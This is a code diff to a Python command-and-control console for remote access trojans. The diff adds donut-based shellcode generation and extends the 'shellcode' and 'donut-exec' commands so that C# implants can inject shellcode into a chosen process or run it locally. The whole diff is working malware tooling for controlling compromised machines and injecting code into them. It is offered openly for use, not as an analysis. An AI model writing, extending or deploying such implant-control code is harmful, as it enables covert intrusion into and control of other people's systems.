@@ -14,11 +14,16 @@ import readline
 import logging
 import random
 import base64
+import donut
 import time
 import json
 import sys
 import os
 import re
+
+import warnings
+warnings.filterwarnings("ignore", category=DeprecationWarning) # Oh God I'm so sorry
+# Ignore the "DeprecationWarning: PY_SSIZE_T_CLEAN will be required for '#' formats" warning from donut
 
 # CSCI 201 teacher: Noooo you can't just use global variables to make things easier
 # haha, global variables go brrr
@@ -191,7 +196,7 @@ def pretty_print_banner():
     $$ |  $$ | $$$$$$$ |$$ /  $$ |$$ |  \__| $$$$$$$ |  $$ |    \$$$$$$\        (    / _/    /' o O| ,_( ))___     (`
     $$ |  $$ |$$  __$$ |$$ |  $$ |$$ |      $$  __$$ |  $$ |$$\  \____$$\        ` -|   )_  /o_O_'_(  \\'    _ `\    )
     $$$$$$$  |\$$$$$$$ |\$$$$$$$ |$$ |      \$$$$$$$ |  \$$$$  |$$$$$$$  |          `"\"\"\"`            =`---<___/---'
-    \_______/  \_______| \_______|\__|       \_______|   \____/ \_______/  v2.1.1 Injection addict        "`
+    \_______/  \_______| \_______|\__|       \_______|   \____/ \_______/  v2.1.2 Injection Junkie        "`
     """
     pretty_print(banner)
 
@@ -430,13 +435,22 @@ def send_invoke_assembly(input_data):
     b64data = base64.b64encode(invoke_assembly_data.encode('utf-8')).decode('utf-8')
     return(b64data)
 
+def cs_donut_exec(inp):
+    if(inp.split(" ")[1].isdigit() or inp.split(" ")[1] == "local"):
+        if(len(inp.split(" ")) >= 4): # donut-exec <pid> <donut_path> <donut_args ...>
+            shellcode = donut.create(file=inp.split(" ")[2], params=" ".join(inp.split(" ")[3:]))
+        else:
+            shellcode = donut.create(file=inp.split(" ")[2])
+        return base64.b64encode(shellcode).decode('utf-8') + " " + inp.split(" ")[1]
+    else:
+        if(len(inp.split(" ")) >= 3): # donut-exec <donut_path> <donut_args ...>
+            shellcode = donut.create(file=inp.split(" ")[1], params=" ".join(inp.split(" ")[2:]))
+        else:
+            shellcode = donut.create(file=inp.split(" ")[1])
+    return base64.b64encode(shellcode).decode('utf-8') + " " + shellcode_process
+    
+
 def donut_exec(inp, ratID):
-    import donut # You must 'pip3 install donut-shellcode' to use this feature
-
-    import warnings
-    warnings.filterwarnings("ignore", category=DeprecationWarning) # Oh God I'm so sorry
-    # Ignore the "DeprecationWarning: PY_SSIZE_T_CLEAN will be required for '#' formats" warning
-
     if(inp.split(" ")[1].isdigit() or inp.split(" ")[1] == "local"):
         if(len(inp.split(" ")) >= 4): # donut-exec <pid> <donut_path> <donut_args ...>
             shellcode = donut.create(file=inp.split(" ")[2], params=" ".join(inp.split(" ")[3:]))
@@ -974,11 +988,14 @@ if __name__ == "__main__":
 
                         elif(str.startswith(inp, "shellcode ")):
                             try:
-                                filepath = inp.split(" ")[1]
+                                arg1 = inp.split(" ")[1]
                                 if(types[ratID] == "ps1"):
                                     inp = "shc " +  send_invoke_shellcode(inp, ratID)
                                 elif(types[ratID] == "c#"):
-                                    inp = "shc " + encode_file(filepath)
+                                    if(arg1 == "local" or arg1.isdigit()):
+                                        inp = "shc " + encode_file(inp.split(" ")[2]) + " " + arg1
+                                    else:
+                                        inp = "shc " + encode_file(arg1) + " " + shellcode_process
                                 else:
                                     inp = "shc " + msbuild_path + " " + send_shellcode_msbuild_xml(inp, ratID)
                             except Exception as e:
@@ -991,8 +1008,7 @@ if __name__ == "__main__":
                                 pretty_print("[!] Feature is unsupported for PS1 rats, sorry")
                                 continue
                             elif(types[ratID] == "c#"):
-                                pretty_print("[!] Feature is unsupported for C# rats, sorry")
-                                continue
+                                inp = "shc " + cs_donut_exec(inp)
                             else:
                                 inp = "shc " + msbuild_path + " " + donut_exec(inp, ratID)
 
